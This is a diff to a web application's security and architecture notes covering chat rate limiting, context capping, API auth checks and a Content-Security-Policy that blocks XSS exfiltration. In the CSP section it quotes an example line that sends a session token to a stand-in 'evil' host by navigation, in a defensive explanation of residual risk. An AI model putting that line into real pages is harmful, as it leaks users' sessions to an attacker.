@@ -214,7 +214,8 @@ real tenant filter rather than a cross-tenant read (see Auth and security).
 ### `daily_metrics` is written but barely read
 
 The pipeline upserts a row per source per day, and the **only** consumer is
-`app/api/chat/route.ts` (last 14 days). The brief pipeline never reads history:
+`app/api/chat/route.ts` (last 14 days, then capped to a character budget —
+see Rate limits below). The brief pipeline never reads history:
 `prev_day`, `week_total`, `prev_week_total`, `days_since_last_ship` and
 `days_since_last_signup` are all
 re-fetched live from the source APIs on every run. A brief can compare to
@@ -871,11 +872,14 @@ What is in place today, in one list — the sections below give the reasoning:
 | `anon` / `authenticated` hold no table grants at all | migration `0003` |
 | RLS enabled on all six tables, owner-scoped `select` | migration `0001` |
 | Tenant scoping enforced mechanically | `npm run check:scoping` |
+| Every `/api` handler authenticates itself, enforced mechanically | `npm run check:api-auth` |
 | `SECURITY DEFINER` functions not callable over the API | migration `0002`, plus a manual revoke on Supabase's `rls_auto_enable()` |
 | SSRF bounded — no endpoint accepts a URL from the client | `projectRef` regex |
 | Prompt-injection clause in both system prompts | `brief/generate.ts`, `api/chat` |
 | Cron bearer token compared with `timingSafeEqual`, fails closed | `api/cron/hourly` |
-| Rate limits: 30 chat/5min, 1 brief/30s | per route |
+| Rate limits: 30 chat/5min, 1 brief/30s. Chat stores the question **before** counting, so a burst fails closed | per route |
+| Chat context hard-capped at ~19k tokens; oldest days dropped first and the model is told | `api/chat` |
+| CSP blocks the exfiltration half of an XSS — see below | `next.config.mjs` |
 | Billing webhook authorised by Stripe signature, not session | `api/billing/webhook` |
 | Checkout return verifies the session belongs to the caller | `api/billing/return` |
 | Tier is never client-trusted; `/api/settings` cannot write it | zod allowlist in `api/settings` |
@@ -983,6 +987,23 @@ names are validated as Postgres identifiers because they end up in a URL path.
 **Rate limits** — 30 chat messages / 5 min / user (DB-backed, so it holds across
 serverless instances); one manual brief / 30s / user.
 
+The chat limit stores the question **before** counting, and that ordering is the
+limit. Counting first and inserting afterwards is check-then-act: concurrent
+requests all read the same pre-insert count, all see room, and all proceed — so
+the limit bounded sequential use and nothing else, on an endpoint where every
+call is an LLM bill. Inserting first makes each request visible to every count
+after it, and a burst that still races is over-counted rather than under-counted,
+so it fails closed. A refused question stays in the table: `service_role` holds
+only `select, insert` here (migration `0003`), and it must keep counting toward
+the window or the limit resets by being exceeded.
+
+**Chat context is capped**, not just windowed — 50k characters of metrics and
+25k of briefs, roughly 19k tokens, oldest days dropped first. A typical one- or
+two-connector founder is nowhere near it. When days are dropped the model is
+told so explicitly, because a model that cannot see a period will otherwise
+report it as empty, and inventing a fact is the one thing this product must not
+do.
+
 **Account deletion is a single `auth.users` delete** (`DELETE /api/account`).
 All six tables cascade from it, so there is no cleanup list to maintain — and
 deliberately so, because a hand-written list is what falls out of date when a
@@ -993,6 +1014,42 @@ delete would mean a `deleted_at` column threaded through every query.
 Two things deletion cannot reach, and the UI says both: the GitHub App stays
 installed until the user removes it, and Supabase keeps its record of the OAuth
 authorisation. Neither can reach anything once the row is gone.
+
+### Content-Security-Policy
+
+Set in `next.config.mjs`, assembled from `NEXT_PUBLIC_SUPABASE_URL` rather than
+a hardcoded host so the allowed origin cannot drift from the one the browser
+client actually calls.
+
+**Why it matters more here than usual.** `@supabase/ssr` sets its auth cookies
+with `httpOnly: false` — it has to, because the browser client reads the session
+on the login page. So an XSS here is a session takeover, not a defacement.
+
+**`script-src` keeps `'unsafe-inline'`, deliberately.** The strict alternative
+is a per-request nonce from middleware, which Next.js supports — but a nonce
+changes every request, so every page must render dynamically, and `/login`,
+`/preview`, `/privacy` and `/terms` are currently static. Making the sign-in and
+marketing pages dynamic to harden against an XSS that does not exist is the
+wrong side of that trade. **Revisit the moment any feature renders user-supplied
+HTML**, at which point the static rendering is worth giving up.
+
+What the policy still buys, with inline script allowed, is the *exfiltration*
+half of the attack — verified in a browser against a production build:
+
+| Attempt | Result |
+|---|---|
+| `fetch()` to an external host | blocked by `connect-src` |
+| image beacon to an external host | blocked by `img-src` |
+| injecting `<script src="//attacker">` | blocked by `script-src` |
+| Supabase Auth (sign-in) | allowed |
+| same-origin `/api/*` | allowed |
+
+Stealing a session is only useful if you can send it somewhere.
+
+**What CSP cannot stop:** top-level navigation. `navigate-to` is not implemented
+by browsers, so `location = 'https://evil/?t=' + token` remains open to any
+script that runs. That is the residual risk, and the reason the answer to a real
+XSS is fixing the XSS.
 
 ### Knowing when a brief fails
 
